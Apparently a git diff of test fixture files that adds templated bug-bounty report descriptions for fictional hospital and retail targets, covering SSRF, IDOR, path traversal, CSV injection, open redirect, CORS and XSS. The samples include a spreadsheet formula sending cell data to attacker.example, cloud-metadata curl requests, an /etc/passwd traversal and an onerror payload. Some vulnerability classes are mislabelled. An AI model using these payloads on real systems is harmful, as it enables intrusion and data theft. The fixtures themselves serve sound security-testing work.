+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.schwanensee-spital.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8136,7 +8198,8 @@
           "offset": "4d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.schwanensee-spital.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8280,7 +8343,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schwanensee-spital.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8371,7 +8435,8 @@
           "offset": "4d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8523,7 +8588,8 @@
           "offset": "2d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8659,7 +8725,8 @@
           "offset": "7d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schwanensee-spital.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8766,7 +8833,8 @@
           "offset": "10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8918,7 +8986,8 @@
           "offset": "5d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.schwanensee-spital.foo/import`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9041,7 +9110,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.schwanensee-spital.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9225,7 +9295,8 @@
           "offset": "6d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9349,7 +9420,8 @@
           "offset": "2d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schwanensee-spital.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9513,7 +9585,8 @@
           "offset": "8d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9621,7 +9694,8 @@
           "offset": "1d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9740,7 +9814,8 @@
           "offset": "22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9867,7 +9942,8 @@
           "offset": "1d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.schwanensee-spital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9979,7 +10055,8 @@
           "offset": "7d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10077,7 +10154,8 @@
           "offset": "2d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10169,7 +10247,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.schwanensee-spital.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10313,7 +10392,8 @@
           "offset": "5d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10447,7 +10527,8 @@
           "offset": "2d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.schwanensee-spital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10561,7 +10642,8 @@
           "offset": "1d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10729,7 +10811,8 @@
           "offset": "5d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.schwanensee-spital.foo/profile`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10856,7 +10939,8 @@
           "offset": "1d 12h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10998,7 +11082,8 @@
           "offset": "7d 4h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.schwanensee-spital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11114,7 +11199,8 @@
           "offset": "13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schwanensee-spital.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11229,7 +11315,8 @@
           "offset": "4d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.schwanensee-spital.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/zedernfeld_retail_reports.json b/fixtures/reports/zedernfeld_retail_reports.json
index 4970717..4e1b775 100644
--- a/fixtures/reports/zedernfeld_retail_reports.json
+++ b/fixtures/reports/zedernfeld_retail_reports.json
@@ -51,7 +51,8 @@
           "offset": "1d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The review moderation queue renders user-submitted review comments using innerHTML in an admin-only interface without prior HTML-encoding or sanitization. As a result, any shopper can submit a review containing an HTML/JS payload that will execute automatically in the context of an authenticated moderator when the queue is opened. The absence of a restrictive Content Security Policy further increases exploit reliability and enables data exfiltration or UI redressing attacks against administrative workflows.\n\n### Technical analysis\n- Vulnerability class: **Stored/Reflected XSS**\n- Affected target: `https://shop.zedernfeld-retail.foo/reviews`\n- Preconditions: authenticated user: authenticated shopper; app version: Shop 4.2\n\n```javascript\n// Sanitize and HTML-encode untrusted data before DOM insertion\nconst unsafe = req.body.subject;\n// BAD\ndocument.querySelector('#subject').innerHTML = unsafe;\n// GOOD\ndocument.querySelector('#subject').textContent = unsafe;\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create or log in to a shopper account and navigate to the product review submission form.\n- Submit a review whose comment contains an event-handler payload such as <img src=x onerror=alert(1)>, then wait for moderation.\n- Log in as an admin/moderator and open the moderation queue page listing pending reviews.\n- Observe immediate execution of the payload as the comment is injected into the DOM via innerHTML without encoding.\n- Open the individual review detail panel and confirm the payload executes there as well, indicating multiple vulnerable render paths.\n\n### Recommendations\n- HTML-encode untrusted data before DOM insertion.\n- Prefer `textContent`/safe templating.\n- Deploy strict CSP; strip dangerous tags/attributes.\n"
     },
     "triager": {
       "status": "accepted",
@@ -156,7 +157,8 @@
           "offset": "4d 18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -315,7 +317,8 @@
           "offset": "8d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -446,7 +449,8 @@
           "offset": "8d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -618,7 +622,8 @@
           "offset": "4d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
